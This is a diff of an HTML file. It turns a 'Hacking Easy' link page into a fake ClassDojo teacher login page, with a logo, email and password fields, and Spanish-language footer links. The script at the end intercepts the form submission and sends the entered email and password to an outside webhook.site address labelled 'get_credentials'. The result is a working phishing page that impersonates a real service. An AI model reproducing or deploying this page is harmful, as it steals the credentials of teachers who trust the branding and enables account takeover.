@@ -1,16 +1,127 @@
 <!DOCTYPE html>
-<html>
+<html lang="es">
 <head>
-	<title>Hacking Easy</title>
-	<link rel="stylesheet" type="text/css" href="styles.css">
+  <meta charset="UTF-8">
+  <title>Classdojo For Teachers</title>
+  <style>
+    body {
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      flex-direction: column;
+      font-family: Helvetica;
+      font-weight: bold;
+      border-radius: 10px;
+    }
+    .logo {
+      max-width: 150px;
+      height: auto;
+      margin-bottom: 20px;
+    }
+    .login-box {
+      text-align: center;
+      border: 1px solid #ccc;
+      padding: 20px;
+      max-width: 230px;
+      width: 100%;
+      border-radius: 20px;
+    }
+    .title {
+      font-size: 24px;
+      margin-bottom: 20px;
+    }
+    .input-container {
+      margin-bottom: 15px;
+      display: flex;
+      text-align: left;
+      border-radius: 10px;
+      justify-content: center;
+    }
+    .input-container input {
+      width: calc(100% - 50px);
+      padding: 13px;
+      margin-top: 5px;
+      border: 1.5px solid #555; /* Agrega un borde de 1 píxel sólido */
+      border-radius: 10px; /* Redondea los bordes de los campos de entrada */
+      box-shadow: none; /* Elimina cualquier sombra predeterminada */
+    }
+    .login-btn {
+      padding: 15px 20px;
+      background-color: #007bff;
+      color: #fff;
+      border: none;
+      cursor: pointer;
+      border-radius: 10px;
+      width: calc(100% - 22px);
+    }
+    .login-btn:hover {
+      background-color: #0056b3;
+    }
+    .footer {
+      margin-top: 20px;
+      font-size: 12px;
+      text-align: center;
+    }
+
+    .blue-link {
+      color: #007bff; /* Cambia el color del enlace a azul celeste */
+      text-decoration: none;
+      padding: 20px;
+    }
+
+    .gris-link {
+      color: #555; /* Cambia el color del enlace a azul celeste */
+      text-decoration: none;
+    }
+
+  </style>
 </head>
 <body>
-	<h1>Hacking Easy</h1>
-	<ul>
-		<li><a href="linux/linux.html">Linux</a></li>
-		<li><a href="windows/windows.html">Windows</a></li>
-		<li><a href="lindows/lindows.html">Lin/dows</a></li>
-	</ul>
-	<script src="script.js"></script>
+  <img src="classdojo-logo.png" alt="Logo de la página" class="logo">
+  <div class="login-box">
+    <div class="title">Log in</div>
+    <form id="loginForm">
+      <div class="input-container">
+        <input type="email" id="email" name="email" placeholder="Email">
+      </div>
+      <div class="input-container">
+        <input type="password" id="password" name="password" placeholder="Password">
+      </div>
+      <button type="submit" class="login-btn">Iniciar Sesión</button>
+    </form>    
+    <div class="footer">
+      <p><a href="#" class="blue-link">Forgot your password?</a></p>
+      <p><a href="#" class="blue-link">Don't have an account?</a></p>
+      <p><a href="#" class="gris-link">Log in without a password</a></p>
+    </div>
+  </div>
+  <div class="footer">
+    <p>© ClassDojo 2023 <a href="#" class="gris-link">Política de privacidad</a> <a href="#" class="gris-link">Términos del servicio</a></p>
+  </div>
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(event) {
+      event.preventDefault();
+      
+      const formData = new FormData(this);
+      
+      fetch("https://webhook.site/7ae607d6-defc-46a2-a4ef-54a781926417/get_credentials", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => {
+        if (response.ok) {
+          return response.json();
+        }
+        throw new Error("Error en la solicitud");
+      })
+      .then(data => {
+        console.log(data);
+      })
+      .catch(error => {
+        console.error(error);
+      });
+    });
+  </script>
 </body>
 </html>
